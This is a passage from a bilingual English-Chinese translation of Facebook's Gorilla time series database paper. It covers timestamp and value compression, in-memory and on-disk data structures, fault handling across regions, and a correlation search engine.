constrained.</p><p>我们分析了 ODS 中存储的时间序列数据，因此我们尝试优化 Gorilla 中实现的数据压缩方案。我们观察到绝大部分的 ODS 数据的时间间隔都是固定的。例如，时间序列通常每 60 秒记录一个点，有时这个点可能会提前或者推迟 1 秒，但是时间窗口通常都是固定的。</p><p>Rather than storing timestamps in their entirety, we store an efficient delta of deltas. If the delta between time stamps for subsequent data points in a time series are 60, 60, 59 and 61 respectively, the delta of deltas is computed by subtracting the current time stamp value from the previous one which gives us 0, -1 and 2. An example of how this works is shown in Figure 2.</p><p>我们不是存储完整的时间戳，而是存储一个有效的差值的差值（ delta of deltas ）。 如果时间序列中后续数据点的时间戳之间的 delta 分别为 60、60、59 和 61，则 delta 的 delta 是通过从前一个时间戳值中减去当前时间戳值来计算的，得到 0、-1 和 2 . 图 2 展示了其工作原理的一个示例。</p><p>We next encode the delta of deltas using variable length encoding with the following algorithm:</p><p>接下来，我们使用以下算法使用可变长度编码对 <strong>差值的差值</strong>（delta of delta） 进行编码：</p><ol><li>The block header stores the starting time stamp, t−1, which is aligned to a two hour window; the first time stamp, t0, in the block is stored as a delta from t−1 in 14 bits.</li><li>For subsequent time stamps, tn:<ul><li>Calculate the delta of delta: D &#x3D; (tn − t(n−1)) − (t(n−1) − t(n−2))</li><li>If D is zero, then store a single ‘0’ bit</li><li>If D is between [-63, 64], store ‘10’ followed by the value (7 bits)</li><li>If D is between [-255, 256], store ‘110’ followed by the value (9 bits)</li><li>If D is between [-2047, 2048], store ‘1110’ followed by the value (12 bits)</li><li>Otherwise store ‘1111’ followed by D using 32 bits</li></ul></li></ol><br /><ol><li>数据块的头部存储起始时间戳（ t-1 ），对齐窗口为 2 小时；数据块中的第一个时间戳（ t0 ）存储为 14 位中（ t-1 ）的增量。</li><li>对于后续的时间戳（ tn ）：<ul><li>计算差值的差值：D &#x3D; (tn − t(n−1)) − (t(n−1) − t(n−2)) ；</li><li>如果 D 为 0 ，则使用 1 个比特位来存储 ‘0’ ；</li><li>如果 D 的范围位于 [-63, 64] ，则先使用 2 个比特位存储 ‘10’ ，然后再使用 7 个比特位存储 D 值；</li><li>如果 D 的范围位于 [-255, 256] ，则先使用 3 个比特位存储 ‘110’ ，然后再使用 9 个比特位存储 D 值；</li><li>如果 D 的范围位于 [-2047, 2048] ，则先使用 4 个比特位存储 ‘1110’ ，然后再使用 12 个比特位存储 D 值；</li><li>其他情况下，则先使用 4 个比特位存储 ‘1111’ ，然后再使用 32 个比特位存储 D 值；</li></ul></li></ol><p>The limits for the different ranges were selected by sampling a set of real time series from the production system and selecting the ones that gave the best compression ratio. A time series might have data points missing but the existing points likely arrived at fixed intervals. For example if there’s one missing data point the deltas could be 60, 60, 121 and 59. The deltas of deltas would be 0, 61 and -62. Both 61 and -62 fit inside the smallest range and fewer bits can be used to encode these values. The next smallest range [-255, 256] is useful because a lot of the data points come in every 4 minutes and a single data point missing still uses that range.</p><p>这些不同的取值范围是从真实的生产环境的时间序列中采样出来的，每个值都能选择合适的范围以达到最好的压缩比。一个时间序列可能会丢失部分数据点，但是它现存的数据很可能都是以固定的时间间隔产生的。例如，如果缺少了一个数据点，则增量可能是 60，60，121，59，那么差值的差值（ delta of deltas ）将是 0，61 和 -62。其中 61 和 -62 都处于最小的的范围内，并且可以使用较小的位来编码这些值。下一个编码取值范围 [-255, 256] 也很有用，因为还有很多数据点是每 4 分钟出现一次，当缺少了单个数据点时仍然可以使用这个取值范围。</p><div><p><img src="/assets/images/gorilla-cn-4.png" alt="图 4" loading="lazy"></p></div><p>Figure 4: Visualizing how XOR with the previous value often has leading and trailing zeros, and for many series, non-zero elements are clustered.</p><p>图 4：展示了与前一个值的 XOR 通常如何具有前导零和尾随零，并且对于许多时间序列，非零元素通常是聚集在一起的。</p><p>Figure 3 show the results of time stamp compression in Gorilla. We have found that about 96% of all time stamps can be compressed to a single bit.</p><p>图 3 显示了 Gorilla 中时间戳压缩的结果。 我们发现大约 96% 的时间戳可以压缩到一个位。</p><h4 id="4-1-2、值压缩"><a href="#4-1-2、值压缩" class="headerlink" title="4.1.2、值压缩"></a>4.1.2、值压缩</h4><p>In addition to the time stamp compression, Gorilla also compresses data values. Gorilla restricts the value element in its tuple to a double floating point type. We use a compression scheme similar to existing floating point compression algorithms, like the ones described in [17] and [25].</p><p>除了压缩时间戳，Gorilla 还会压缩数据值。 Gorilla 将其元组中的数据值限制为双浮点类型。 我们使用类似于现有浮点压缩算法的压缩方案，类似于 [17] 和 [25] 中描述的那些。</p><p>From analyzing our ODS data, we discovered that the value in most time series does not change significantly when compared to its neighboring data points. Further, many data sources only store integers into ODS. This allowed us to tune the expensive prediction scheme in [25] to a simpler implementation that merely compares the current value to the previous value. If values are close together the sign, exponent, and first few bits of the mantissa will be identical. We leverage this to compute a simple XOR of the current and previous values rather than employing a delta encoding scheme.</p><p>通过分析 ODS 的数据，我们发现大多数时间序列中的值与其相邻数据点的值相比没有显著的变化。 此外，许多数据源只会将整数存储到 ODS 中。 这使我们可以将文末参考文献 [25] 中的复杂方案调整为更简单的实现，该实现仅将当前值与先前值进行比较。 如果值接近，那么尾数的符号、指数和前几位将完全相同。 因此对当前值和前一个值做一个简单的异或（XOR）运算，而不是像时间戳那样采用差值编码方案。</p><p>We then encode these XOR’d values with the following variable length encoding scheme:</p><p>我们用下面的规则对异或（XOR）后的值进行可变长编码：</p><ol><li>The first value is stored with no compression</li><li>If XOR with the previous is zero (same value), store single ‘0’ bit</li><li>When XOR is non-zero, calculate the number of leading and trailing zeros in the XOR, store bit ‘1’ followed by either a) or b):<ul><li>(Control bit ‘0’) If the block of meaningful bits falls within the block of previous meaningful bits, i.e., there are at least as many leading zeros and as many trailing zeros as with the previous value use that information for the block position and just store the meaningful XORed value.</li><li>(Control bit ‘1’) Store the length of the number of leading zeros in the next 5 bits, then store the length of the meaningful XORed value in the next 6 bits. Finally store the meaningful bits of the XORed value.</li></ul></li></ol><br /><ol><li>第一个值不进行压缩存储；</li><li>如果与前一个值的异或（XOR）结果为零（相同值），则使用 1 个比特位存储 ‘0’ ；</li><li>当 XOR 不为零时，计算 XOR 中前导零和尾随零的数量，则使用 1 个比特位存储 ‘1’ ，接下来的值为下面两种之一：<ul><li>（控制位 ‘0’ ）如果有意义的位（即中间非 0 部分）的数据块被前一个数据块包含，即，至少有与先前值一样多的前导零和尾随零，那么就可以直接在数据块中使用这些信息，并且仅需要存储非 0 的 XOR 值；</li><li>（控制位 ‘1’ ）将前导零数量的长度存储在接下来的 5 位中，然后将有意义的 XOR 值的长度存储在接下来的 6 位中。 最后存储 XOR 值的有意义的位；</li></ul></li></ol><div><p><img src="/assets/images/gorilla-cn-5.png" alt="图 5" loading="lazy"></p></div><p>Figure 5: Distribution of values compressed across different XOR buckets. Taken from a sample of 1.6 million real values in Gorilla.</p><p>图 5：不同 XOR 存储桶压缩的值分布。 取自 Gorilla 中 160 万个真实值的样本。</p><p>The overall compression scheme is visualized in Figure 2 which depicts how our XOR encoding can store the values in a time series efficiently.</p><p>整体压缩方案如图 2 所示，它描述了我们的 XOR 编码如何有效地将值存储在时间序列中。</p><p>Figure 5 shows the distribution of actual values in Gorilla. Roughly 51% of all values are compressed to a single bit since the current and previous values are identical. About 30% of the values are compressed with the control bits ‘10’ (case b), with an average compressed size of 26.6 bits. The remaining 19% are compressed with control bits ‘11’, with an average size of 36.9 bits, due to the extra 13 bits of overhead required to encode the length of leading zero bits and meaningful bits.</p><p>图 5 显示了 Gorilla 中实际值的分布。 由于当前值和以前的值相同，因此大约 51% 的值被压缩后仅使用 1 个比特位。 大约 30% 的值使用控制位 ‘10’（情况 b）进行压缩，平均压缩大小为 26.6 位。 剩余的 19% 使用控制位 ‘11’ 进行压缩，平均大小为 36.9 位，位数多是因为编码前导零位和有意义位的长度需要额外的 13 位开销。</p><p>This compression algorithm uses both the previous floating point value and the previous XORed value. This results in an additional compression factor because a sequence of XORed values often have a very similar number of leading and trailing zeros, as visualized in Figure 4. Integer values compress especially well because the location of the one bits after the XOR operation is often the same for the whole time series, meaning most values have the same number of trailing zeros.</p><p>这种压缩算法同时使用了前序值和前序XOR值。如图 4 所示，由于 XOR 值的序列通常具有非常相似数量的前导零和尾随零，因此最终的结果会有较好的压缩率。这种算法对于整型的压缩效果尤其好，这是因为经过 XOR 运算后的中间段位的位置一般在整个时间序列中对齐的，意味着大多数XOR值有相同个数的尾随零。</p><p>One trade-off that is inherent in our encoding scheme is the time span over which the compression algorithm operates. Using the same encoding scheme over larger time periods allows us to achieve better compression ratios. However, queries that wish to read data over a short time range might need to expend additional computational resources on decoding data. Figure 6 shows the average compression ratio for the time series stored in ODS as we change the block size. One can see that blocks that extend longer than two hours provide diminishing returns for compressed size. A two-hour block allows us to achieve a compression ratio of 1.37 bytes per data point.</p><p>我们的编码方案有一个折衷是压缩算法运行的时间跨度。 在更长的时间段内使用相同的编码方案可以让我们获得更好的压缩比。但是，这会导致在短时间内读取数据的操作可能需要在解码数据上花费额外的计算资源。图 6 显示了存储在 ODS 中的时间序列在不同数据块大小下的平均压缩率。可以看出，块大小超过两个小时之后，数据的压缩收益率是逐渐减少的。两小时的数据块使得我们能够实现每个数据点占用大约 1.37 个字节。</p><div><p><img src="/assets/images/gorilla-cn-6.png" alt="图 6" loading="lazy"></p></div><p>Figure 6: Average bytes used for each ODS data point as the compression bucket is varied from 0 (no compression) to 240 minutes. Bucket size larger than two hours do not give significant additional compression for our dataset. This is across the entire production Gorilla data set (approximately 2 billion time series).</p><p>图 6：每个 ODS 数据点所占用的平均字节数，因为压缩桶（数据块）从 0（无压缩）到 240 分钟不等。 大于两个小时的桶大小不会为我们的数据集提供明显的压缩效果。 这是整个生产 Gorilla 数据集（大约 20 亿个时间序列）。</p><h3 id="4-2、内存数据结构"><a href="#4-2、内存数据结构" class="headerlink" title="4.2、内存数据结构"></a>4.2、内存数据结构</h3><p>The primary data structure in Gorilla’s implementation is a Timeseries Map (TSmap). Figure 7 provides an overview of this data structure. TSmap consists of a vector of C++ standard library shared-pointers to time series and a caseinsensitive, case-preserving map from time series names to the same. The vector allows for efficient paged scans through all the data, while the map enables constant time lookups of particular time series. Constant time lookup is necessary to achieve the design requirement for fast reads while still allowing for efficient data scans.</p><p>Gorilla 实现中的主要数据结构是时间序列 Map （TSmap）。 图 7 提供了该数据结构的概述。 时间序列图包含一个 C++ 标准库中的 vector ，它是一个指向时间序列的指针；还包含一个 map ，其中 key 位时间序列的名称，不区分大小写并且保留原有大小写，值是和 vector 中一样的指针。vector 可以实现全数据分页查询，而 map 可以支撑指定时间序列的定长时间段查询，要满足快速查询的需求必须要具备恒定时间的查询能力，同时也要满足有效的数据扫描。</p><p>The use of C++ shared-pointers enables scans to copy the vector (or pages thereof) in a few microseconds, avoiding lengthy critical sections that would impact the flow of incoming data. On deletion of a time series, a vector entry is tombstoned, and the index is placed in a free pool which is re-used when new time series are created. Tombstoneing a section of memory marks it as ’dead’, and ready to be reused, without actually freeing it to the underlying system.</p><p>使用 C++ 共享指针可以在扫描时能够仅用几微秒内就复制整个 vector（或者其中的几页），避免冗长数据对传入的数据流产生影响。删除时间序列时，它的 vector 被标记为 “墓碑状态” ，它的索引会被放到一个空闲迟中，当创建新的时间序列时会被复用。”墓碑状态” 实际上是将一段内存标记为 “死亡” ，并准备好被复用，实际上并未将其释放到底层系统。</p><p>Concurrency is attained with a single read-write spin lock protecting map and vector access and 1-byte spin lock on each time series. Since each individual time series has a relatively low write throughput, the spin lock has very low contention between reads and writes.</p><p>每个时间序列上有一个读写自旋锁用于保护对 map 和 vector 的并发访问。由于单个时间序列具有相对较低的写入吞吐量，因此自旋锁在读取和写入间的竞争非常低。</p><p>As illustrated in Figure 7, the mapping of shard identifier (shardId) to TSmap, named ShardMap, is maintained with a vector of pointers to the TSmaps. Mapping of a time series name to a shard is done using the same caseinsensitive hash in the TSmap, mapping it to an ID between [0, NumberOfShards]. Since the total number of shards in the system is constant and numbering in the low thousands, the additional overhead of storing null pointers in the ShardMap is negligible. Like the TSmaps, concurrent access to the ShardMap is managed with a read-write spin lock.</p><p>如图 7 所示，分片唯一标识 （shardId） 与 TSmap 的映射存储在 ShardMap 中，它是一个存储了 TSmaps 指针的 vector。时间序列名称到分片的映射使用了与 TSmap 中一样的对大小写不敏感的哈希算法，哈希后的值位于 [0, NumberOfShards]  之间。由于系统中分片的数量固定，并且总量只有几千个，因此在 ShardMap 中存储空指针的额外开销可以忽略不计。 与 TSmap 一样，对 ShardMap 的并发访问也是由读写自旋锁管理。</p><p>Since the data are already partitioned by shard, individual maps remain sufficiently small (about 1 million entries), the C++ standard library unordered-map has sufficient performance, and there have been no issues with lock contention.</p><p>由于数据已经被 shard 分区，单个 map 仍然可以足够小（大约 100 万个条目），C++ 标准库 unordered-map 具有足够好的性能，并且不会发生锁争用的问题。</p><div><p><img src="/assets/images/gorilla-cn-7.png" alt="图 7" loading="lazy"></p></div><p>Figure 7: Gorilla in-memory data structure.</p><p>图 7：Gorilla 内存数据结构。</p><ul><li>a) On a query, first the TSmap pointer is examined. </li><li>b) if the pointer is null, it means this Gorilla host does not own the shard. If non-null, </li><li>c) then the TSmap is read-locked, and the pointer to the time series structure (TS) is found in the unordered map and copied out. At this point, both RW locks can be unlocked.</li><li>d) Next, the TS spinlock is locked, and data for the query time range can be directly copied out of the TS.</li></ul><br /><ul><li>a) 在查询时，首先检查 TSmap 指针。 </li><li>b) 如果指针为空，则表示此 Gorilla 主机不拥有该分片。</li><li>c) 如果指针非空，则  TSmap 被读锁定，并且在无序映射中找到指向时间序列结构 (TS) 的指针并复制出来。 此时，两个 RW 锁都可以解锁。 </li><li>d) 接下来，TS 自旋锁被锁定，查询时间范围的数据可以直接从 TS 中复制出来。</li></ul><p>A time series data structure is composed of a sequence of closed blocks for data older than two hours and a single open data block that holds the most recent data. The open data block is an append-only string, to which new, compressed time stamps and values are appended. Since each block holds two hours of compressed data, the open block is closed once it is full. Once a block is closed, it is never changed until it is deleted out of memory. Upon closing, a block is copied to memory allocated from large slabs to reduce fragmentation. While the open block is often reallocated as it changes sizes, we find that the copy process reduces the overall fragmentation within Gorilla.</p><p>时间序列的数据结构有两个组成部分：一部分是两小时以上数据的封闭块，一部分是保存最新数据的开放块。开放块是一个只追加的字符串，新的时间戳和值压缩后会追加到这个字符串上。由于每个块置存储两个小时的压缩数据，因此开发块一旦满了之后就会封闭，一个块被关闭后它就永远不会被改变，知道将它从内存中删除。关闭块时，会根据使用的 slab 总大小分配出一个新的数据块存储数据，虽然开放的数据块在改变大小时也会重新分配，但是我们发现通过这种方式能够减少 Gorilla 的整体内存碎片。</p><p>Data is read out by copying the data blocks that could contain data for the queried time range directly into the output remote procedure call structure. The entire data block is returned to the client, leaving the decompression step to be done outside Gorilla.</p><p>通过将可能包含查询时间范围内数据的数据块直接复制到远程调用的数据结构中来读取数据。 将整个数据块返回给客户端，使得解压的过程可以在 Gorilla 外完成。</p><h3 id="4-3、磁盘数据结构"><a href="#4-3、磁盘数据结构" class="headerlink" title="4.3、磁盘数据结构"></a>4.3、磁盘数据结构</h3><p>One of our goals for Gorilla is to survive single host failures. Gorilla achieves persistence by storing data in GlusterFS, a POSIX-compliant, distributed file system [4] with 3x replication. HDFS or other distributed file systems would have sufficed just as easily. We also considered single host databases such as MySQL and RocksDB but decided against these because our persistency use case did not require a database query language.</p><p>Gorilla 的目标之一是能够应对单机故障。Gorilla 通过将数据存储在 GlusterFS 中来实现持久性，GlusterFS 是一种符合 POSIX 的支持三副本复制的分布式文件系统 [4]。HDFS 或者其他的分布式文件系统也同样可以应对单机故障。我们还考虑了 MySQL 和 RocksDB 等单机数据库，不过最终还是决定不使用这类数据库，因为我们的持久化场景中不会使用数据库查询语音。</p><p>A Gorilla host will own multiple shards of data, and it maintains a single directory per shard. Each directory contains four types of files: Key lists, append-only logs, complete block files, and checkpoint files.</p><p>Gorilla 主机将拥有多个数据分片，并且每个分片维护一个目录。 每个目录包含四种类型的文件：key 列表、 append-only 日志、完整块文件和 checkponit 文件。</p><p>The key list is simply a map of the time series string key to an integer identifier. This integer identifier is the index into the in-memory vector. New keys are append to the current key list, and Gorilla periodically scans all the keys for each shard in order to re-write the file.</p><p>Key 列表只是时间序列字符串键名到整数标识符的映射。这个整数标识符是内存中 vector 的索引下标。新的密钥会被追加到当前密钥列表中，Gorilla 会定期扫描每个分片的所有密钥，以便重新写入文件。</p><p>As data points are streamed to Gorilla, they are stored in a log file. The time stamps and values are compressed using the format described in Section 4.1. However, there is only one append-only log per shard, so values within a shard are interleaved across time series. This difference from the in memory encoding means that each compressed time stampvalue pair is also marked with it’s 32-bit integer ID, adding significant storage overhead to the per-shard log file.</p><p>当数据点流式传输到 Gorilla 时，它们会被存储在日志文件中。 时间戳和值会被按照第 4.1 节中描述的格式进行压缩。 但是，每个分片只有一个 append-only 日志，因此数据会交叉跨越多个时间序列。和内存编码不同的是，每个时间戳和值还要加上 32 位的整型 ID 进行标记，所以相比之下，每个分片上的日志文件会增加明显的存储开销。</p><p>Gorilla does not offer ACID guarantees and as such, the log file is not a write-ahead-log. Data is buffered up to 64kB, usually comprising one or two seconds worth of data, before being flushed. While the buffer is flushed on a clean shutdown, a crash might result in the loss of small amounts of data. We found this trade-off to be worth the data loss, as it allowed higher data rate to be pushed to disk and higher availability for writes compared with a traditional write-ahead log.</p><p>Gorilla 不提供 ACID 保证，因此，日志文件不是 WAL 日志。 在被刷新之前，数据缓冲高达 64kB，这通常会包含一到两秒的数据。 虽然在正常退出系统时缓冲区中的数据会被刷到磁盘，但是当发生异常崩溃时可能会导致少部分的数据丢失。相比于传统的 WAL 日志的收益，由于这种方式能够实现以更高的速率将数据写入磁盘并提供更高的写入可用性，因此我们认为这个取舍是值得的。</p><p>Every two hours, Gorilla copies the compressed block data to disk, as this format is much smaller than the log files. There is one complete block file for every two hours worth of data. It has two sections: a set of consecutive 64kB slabs of data blocks, copied directly as they appear in memory, and a list of &lt;time series ID, data block pointer&gt; pairs. Once a block file is complete, Gorilla touches a checkpoint file and deletes the corresponding logs. The checkpoint file is used to mark when a complete block file is flushed to disk. If a block file was not successfully flushed to disk when it on a process crash, when the new process starts up, the checkpoint file will not exist, so the new process knows it cannot trust the block file and will instead read from the log file only.</p><p>每隔两个小时，Gorilla 就会将压缩块数据复制到磁盘，因为这种格式的数据比日志文件小得多。 每两小时的数据就有一个完整的块文件。 它有两个部分：一组连续的 64kB 数据块，他们直接从内存中复制而来，以及一系列由 &lt;时间序列ID，数据块指针&gt; 组成的键值对。一旦某个块文件完全刷到磁盘，Gorilla 就会记录一个 checkpoint 文件并删除相应的日志。checkpoint 文件用来标记一个完整的数据块什么时候被刷到磁盘。如果在遇到进程崩溃时块文件没有被成功刷到磁盘，那么在新的进程启动时对应的 checkpoint 文件是不存在的，因此这个时候每次启动新的进程时除了读取块文件之外，还会从日志文件中读取 checkpoint 之后的数据。</p><h3 id="4-4、故障处理"><a href="#4-4、故障处理" class="headerlink" title="4.4、故障处理"></a>4.4、故障处理</h3><p>For fault tolerance, we chose to prioritize tolerating single node, temporary failures with zero observable downtime and large scale, and localized failures (such as a network cut to an entire region). We did this because single node failures happen quite often, and large scale, localized failures become a concern at Facebook’s scale to allow the ability to operate under natural (or human-caused) disasters. There is the added benefit that one can model rolling software upgrades as a set of controlled, single node failures, so optimizing for this case means hassle-free and frequent code pushes. For all other failures, we chose trade-offs that, when they do cause data-loss, will prioritize the availability of more recent data over older data. This is because we can rely on the existing HBase TSDB system to handle historical data queries, and automated systems that detect level changes in time series are still useful with partial data, as long as has the most recent data.</p><p>对于容错，我们选择优先考虑单节点故障、可感知到的零停机时间和大规模的临时故障，以及局部故障（例如网络切断到整个区域）。 我们这样做是因为单节点故障经常发生，并且大规模的局部故障已经成为 Facebook 比较关注的问题，我们需要有应对自然或人为灾害的能力。还有一个额外的好处是，可以将滚动式的软件升级模拟为一组可控的单节点故障，因此针对这种情况进行优化意味着我们可以轻松且频繁的进行代码推送。 对于其它故障我们选择折衷处理，如果故障会引起数据丢失，将优先考虑最近数据的可用性而不是老数据，这是因为对历史数据的查询可以依赖已有的 Hbase TSDB，一些自动化系统检测时间序列的变化对部分数据仍然有用，只要有最新的数据产生就会有新老数据比较。</p><p>Gorilla ensures that it remains highly available to data center faults or network partitions by maintaining two completely independent instances in separate data center regions. On a write, data is streamed to each Gorilla instance, with no attempt to guarantee consistency. This makes largescale failures easy to handle. When an entire region fails, queries are directed at the other until the first has been back up for 26 hours. This is important to handle large scale disaster events, whether actual or simulated [21]. For example, when the Gorilla instance in region A completely fails, both reads and writes to that region will also fail. The read failures will be transparently retried to the Gorilla instance in the healthy region B. If the event lasts long enough (more than one minute), data will be dropped from region A, and requests will not be retried. When this happens, all reads can be turned off from region A until the cluster has been healthy for at least 26 hours. This remediation can be performed either manually or automated.</p><p>Gorilla 通过在不同的数据中心区域维护两个完全独立的实例，来确保在数据中心故障或网络分区的情况下的高可用。在写入时，数据会流式传输到每个 Gorilla 实例，并且不会去尝试保证数据的一致性。这就使得大规模故障比较容易处理。当整个区域出现故障时，查询将直接指向另一个区域，直到第一个区域已经备份了 26 小时的数据。这在处理大规模灾难时非常重要，无论是实际的还是模拟的 [21]。例如，当区域 A 中的 Gorilla 实例完全挂掉时，对该区域的读取和写入也会失败。失败的读取将会被透明地重试路由到健康区域 B 中的 Gorilla 实例。如果故障持续时间足够长（超过一分钟），数据将从区域 A 丢弃，并且不会重试请求。发生这种情况时，可以关闭区域 A 的所有读取，直到区域 A 的集群恢复健康并且运行了至少 26 小时。这种处理方式在故障发生时可以手动或自动执行。</p><p>Within each region, a Paxos-based [6, 14] system called ShardManager assigns shards to nodes. When a node fails, ShardManager distributes its shards among other nodes in the cluster. During shard movement, write clients buffer their incoming data. The buffers are sized to hold 1 minute of data, and points older than a minute are discarded to make room for newer data. We have found that this time period is sufficient to allow shard reassignment in most situations, but for extended outages, it prioritizes the most recent data, as more recent data is intuitively more useful for driving automated detection systems. When a Gorilla host α in region A crashes or goes down for any reason, writes are buffered for at least 1 minute as the Gorilla cluster tries to resurrect the host. If the rest of the cluster is healthy, shard movement happens in thirty seconds or less, resulting in no data loss. If the movement does not occur fast enough reads can be pointed to the Gorilla instance in region B, either in a manual or automated process.</p><p>在每个区域内都有一个基于 Paxos [6, 14] 的  ShardManager 系统来将分片分配给节点。当一个节点发生故障时，ShardManager 会将这个节点的分片分发给集群中的其他节点。在分片迁移期间，写入的数据会先缓存在客户端的缓冲区。缓冲区的大小可保存 1 分钟的数据，超过 1 分钟的数据将被丢弃，以便为较新的数据腾出空间。我们发现，在大多数情况下，这段时间足以允许重新分配分片，但对于需要长时间的中断的情况，它会优先考虑最近的数据，因为数据越新，从直观上来看对操作自动检测系统来说会更有用。当区域 A 中的 Gorilla 主机 α 因任何原因崩溃或宕机时，在 Gorilla 集群尝试复活主机时，写入将被缓冲至少 1 分钟。如果集群的其余主机是健康的，分片迁移会在 30 秒或更短的时间内触发，这不会导致数据丢失。如果迁移速度不够快，则可以手动或自动过程将读取指向区域 B 中的 Gorilla 实例。</p><p>When shards are added to a host, it will read all the data from GlusterFS. These shards may have been owned by the same host before the restart or another. A host can read and process all the data it needs to be fully functional in about 5 minutes from GlusterFS. Because of the number of shards in the system and the total data stored, each shard represents about 16GB of on-disk storage. This can be read from GlusterFS in just a few minutes, as the files are spread across several physical hosts. While the host is reading the data, it will accept new incoming data points and put them into a queue to be processed at the earliest possible time. When shards are reassigned, clients immediately drain their buffers by writing to the new node. Going back to the Gorilla host α in region A crashing example: when α crashes, the shards are reassigned to host β in the same Gorilla instance. As soon as host β is assigned the shards, it begins accepting streaming writes, so no data loss occurs for in-flight data. If Gorilla host α is going down in a more controlled manner, it flushes all data to disk before exiting, so no data is lost for software upgrades.</p><p>当分片被分配到某台主机时，它将从 GlusterFS 读取所有数据。这些分片可能在重新启动之前（或其他主机之前）由同一主机拥有。新主机从GlusterFS读取和处理完整可用的数据大约需要5分钟时间，这是因为系统中的分片数量和存储的总数据量，每个分片代表大约 16GB 的磁盘存储空间。这可以在几分钟内从 GlusterFS 读取，因为文件分布在多个物理主机上。当主机读取数据时，它将接受新的传入数据点并将它们放入队列中以便尽早处理。重新分配分片时，客户端会立即通过写入新节点来耗尽其缓冲区。回到区域 A 中的 Gorilla 主机 α 崩溃示例：当 α 崩溃时，分片被重新分配给同一 Gorilla 实例中的主机 β。一旦主机 β 被分配了分片，它就开始接受流式写入，因此传输中的数据不会发生数据丢失。如果 Gorilla 主机 α 以更可控的方式出现故障，它会在退出之前将所有数据刷新到磁盘，因此不会因软件升级而丢失任何数据。</p><p>In our example, if host α crashes before successfully flushing its buffers to disk, that data will be lost. In practice, this happens very rarely, and only a few seconds of data is actually lost. We make this trade-off to accept a higher throughput of writes and to allow accepting more recent writes sooner after an outage. Also, we monitor this situation, and are able to point reads at the more healthy region.</p><p>在我们的示例中，如果主机 α 在数据刷盘成功之前挂掉，数据就会丢失。实际上，这种情况很少发生，即使发生了通常也只会丢失几秒钟的数据。 我们做出这种权衡是为了接受更高的写入吞吐量，并允许在中断后更快地接受更新的写入。 此外，我们也有这种情况的监控，并能够在故障发生后将读取指向更健康的区域节点。</p><p>Note that after a node failure, shards will be partially unavailable for reads until the new nodes hosting these shards read the data from disk. Queries will return partial data (blocks are read most recent to least recent) and will mark the results as partial.</p><p>要注意的是，当节点故障时有些分片可能有部分数据不可读，要等到新的节点将这些分片的数据完全从磁盘读取出来。查询可能只返回部分数据（块文件的读取顺序按时间从近到远）并在结果中标记为部分数据。</p><p>When the read client library receives a partial result from its query to the Gorilla instance in region A, it will retry fetching the affected time series from region B and keep those results if they are not partial. If both region A and region B return partial results, both partial results are returned to the caller with a flag set that some error caused incomplete data. The caller can then decide if it has enough information to continue processing the request or if it should fail outright. We make this choice because Gorilla is most often used by automated systems to detect level changes in time series. These systems can function well with only partial data, as long as it is the most recent data.</p><p>当读取客户端库从区域 A 中的 Gorilla 实例的查询中接收到部分结果时，它将重新尝试从区域 B 中获取受影响的时间序列，并保留这些结果（如果它们不是部分结果）。 如果区域 A 和区域 B 都返回部分结果，则两个部分结果都将返回给调用者，并设置一个标志，表明由于某些错误导致数据不完整。 然后调用者可以决定它是否有足够的信息来继续处理请求，或者它是否应该彻底失败。 我们做出这个选择是因为自动化系统最常使用 Gorilla 来检测时间序列中的水平变化。 只要是最新数据，这些系统就可以仅使用部分数据便运行良好。</p><p>Automatic forwarding of reads from an unhealthy host to a healthy one means that users are protected from restarts and software upgrades. We find that upgrading the version of software causes zero data drops, and all reads continue to be served successfully with no manual intervention. This also allows Gorilla to transparently serve reads across server failures ranging from a single node to an entire region [21].</p><p>将读取从不健康的主机自动转发到健康的主机意味着保护用户免受重新启动和软件升级的影响。 我们发现升级软件版本不会导致数据丢失，并且所有读取都会成功，这无需人工干预。 这也允许 Gorilla 无感地提供跨服务器故障的读取，范围从单个节点到整个区域 [21]。</p><p>Finally, we still use our HBase TSDB for long-term storage of data. If all in-memory copies of data are lost, our engineers can still query the more durable storage system to do their analysis and drive ad-hoc queries, and Gorilla can still drive real-time detection of level changes, once it is restarted and accepting new writes.</p><p>最后，我们仍然使用我们的 HBase TSDB 来长期存储数据。 如果所有内存中的数据副本都丢失了，我们的工程师仍然可以查询更持久的存储系统来进行数据分析和专门的查询，而 Gorilla 仍然可以在重启后接受新的数据写入，并继续进行实时数据检测。</p><h2 id="5、Gorilla的新工具"><a href="#5、Gorilla的新工具" class="headerlink" title="5、Gorilla的新工具"></a>5、Gorilla的新工具</h2><p>Gorilla’s low latency query processing has enabled the creation of new analysis tools.</p><p>Gorilla 的低延迟查询特性推动产生了一些新的分析工具。</p><h3 id="5-1、关联引擎"><a href="#5-1、关联引擎" class="headerlink" title="5.1、关联引擎"></a>5.1、关联引擎</h3><p>The first is a time series correlation engine that runs within Gorilla. Correlation search allows users to perform interactive, brute-force search on many time series, currently limited to 1 million at a time.</p><p>首先是一个运行在 Gorilla 上的时间序列关联引擎。 关联搜索允许用户对许多时间序列执行交互式暴力搜索，目前一次限制为 100 万。</p><div><p><img src="/assets/images/gorilla-cn-8.png" alt="图 8" loading="lazy"></p></div><p>Figure 8: Total query latency breakdown with different TSDB solutions for ODS. Comparing to HBase, Gorilla has provided between 73x and 350x improvement, depending on the query size. This plot also includes preliminary results of two other options: Gorilla using flash to store data older than 26 hours, and HBase with ODS cache.</p><p>图 8：针对 ODS 的不同的 TSDB 解决方案的总查询延迟细分。 与 HBase 相比，Gorilla 提供了 73 倍到 350 倍的改进，具体取决于查询大小。 该图还包括其他两个选项的初步结果：Gorilla 使用闪存存储超过 26 小时的数据，以及使用 ODS 缓存的 HBase。</p><p>The correlation engine calculates the Pearson ProductMoment Correlation Coefficient (PPMCC) which compares a test time series to a large set of time series [22]. We find that PPMCC’s ability to find correlation between similarly shaped time series, regardless of scale, greatly helps automate root-cause analysis and answer the question “What happened around the time my service broke?”. We found that this approach gives satisfactory answers to our question and was simpler to implement than similarly focused approaches described in the literature[10, 18, 16].</p><p>关联引擎通过将测试时间序列与大量时间序列 [22] 进行比较来计算皮尔森产品-时间相关系数（PPMCC）。我们发现 PPMCC 能够在类似形状的时间序列之间找到相关性（无论规模如何），这极大地有助于通过自动化方式分析故障的根本原因，并回答 “当服务挂掉时发生了什么”。我们发现这种方法能够给我们带来比较满意的答案，并且比相关文献中描述的类似方案更容易实现 [10,18,16]。</p><p>To compute PPMCC, the test time series is distributed to each Gorilla host along with all of the time series keys. Then, each host independently calculates the top N correlated time series, ordered by the absolute value of the PPMCC compared to the needle, and returning the time series values. In the future, we hope that Gorilla enables more advanced data mining techniques on our monitoring time series data, such as those described in the literature for clustering and anomaly detection [10, 11, 16].</p><p>为了计算 